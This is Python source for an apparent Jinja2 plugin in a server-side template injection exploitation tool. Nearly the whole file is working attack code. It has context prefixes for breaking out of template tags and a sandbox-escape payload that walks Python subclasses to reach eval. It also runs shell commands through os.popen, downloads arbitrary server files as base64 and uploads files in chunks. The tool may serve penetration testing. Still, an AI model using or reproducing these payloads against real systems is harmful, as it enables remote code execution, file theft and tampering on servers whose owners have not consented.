from utils.strings import quote, chunkit, md5
from plugins.languages.python import Python
from utils.loggers import log
from utils import rand
import base64

class Jinja2(Python):

    render_tag = '{{%(payload)s}}'
    header_tag = '{{%(header)s}}'
    trailer_tag = '{{%(trailer)s}}'
    contexts = [

        # This covers {{%s}}
        { 'level': 1, 'prefix': '%(closure)s}}', 'suffix' : '', 'closures' : Python.closure_levels },

        # This covers {% %s %}
        { 'level': 1, 'prefix': '%(closure)s%%}', 'suffix' : '', 'closures' : Python.closure_levels },

        # If and for blocks
        # # if %s:\n# endif
        # # for a in %s:\n# endfor
        { 'level': 5, 'prefix': '%(closure)s\n', 'suffix' : '\n', 'closures' : Python.closure_levels },

        # Comment blocks
        { 'level': 5, 'prefix' : '%(closure)s#}', 'suffix' : '{#', 'closures' : Python.closure_levels },

    ]

    def detect_engine(self):

        randA = rand.randstr_n(2)
        randB = rand.randstr_n(2)

        payload = '{{"%s".join("%s")}}' % (randA, randB)
        expected = randA.join(randB)

        if expected == self.inject(payload):
            self.set('language', 'python')
            self.set('engine', 'jinja2')
            self.set('eval', 'python')

    def detect_eval(self):

        payload = """"-".join([__import__("os").name, __import__("sys").platform])"""
        self.set('os', self.evaluate(payload))
        self.set('eval', 'python')

    def evaluate(self, code):
        return self.inject("""{%% set d = "%s" %%}{%% for c in [].__class__.__base__.__subclasses__() %%} {%% if c.__name__ == 'catch_warnings' %%}
{%% for b in c.__init__.func_globals.values() %%} {%% if b.__class__ == {}.__class__ %%}
{%% if 'eval' in b.keys() %%}
{{ b['eval'](d) }}
{%% endif %%} {%% endif %%} {%% endfor %%}
{%% endif %%} {%% endfor %%}"""  % (quote(code)))

    def detect_exec(self):

        expected_rand = str(rand.randint_n(2))

        if expected_rand == self.execute('echo %s' % expected_rand):
            self.set('exec', True)

    def execute(self, command):

        execution_code = '__import__("os").popen("%s").read()' % quote(command)
        return self.evaluate(execution_code)

    def detect_read(self):
        self.set('read', True)

    def _md5(self, remote_path):

        execution_code = """__import__("hashlib").md5(open("%s", 'rb').read()).hexdigest()""" % remote_path

        return self.evaluate(execution_code)

    def read(self, remote_path):

        # Get remote file md5
        md5_remote = self._md5(remote_path)

        if not md5_remote:
            log.warn('Error getting remote file md5, check presence and permission')
            return

        data_b64encoded = self.evaluate("""__import__("base64").b64encode(open("%s", "rb").read())""" %  remote_path)
        data = base64.b64decode(data_b64encoded)

        if not md5(data) == md5_remote:
            log.warn('Remote file md5 mismatch, check manually')
        else:
            log.info('File downloaded correctly')

        return data

    def detect_write(self):
        self.set('write', True)

    def write(self, data, remote_path):

        # Check existance and overwrite with --force-overwrite
        if self._md5(remote_path):
            if not self.channel.args.get('force_overwrite'):
                log.warn('Remote path already exists, use --force-overwrite for overwrite')
                return
            else:
                self.evaluate("""open("%s", 'w').close()""" % remote_path)

        # Upload file in chunks of 500 characters
        for chunk in chunkit(data, 500):

            chunk_b64 = base64.urlsafe_b64encode(chunk)
            self.evaluate("""open("%s", 'ab+').write(__import__("base64").urlsafe_b64decode('%s'))""" % (remote_path, chunk_b64))

        if not md5(data) == self._md5(remote_path):
            log.warn('Remote file md5 mismatch, check manually')
        else:
            log.info('File uploaded correctly')
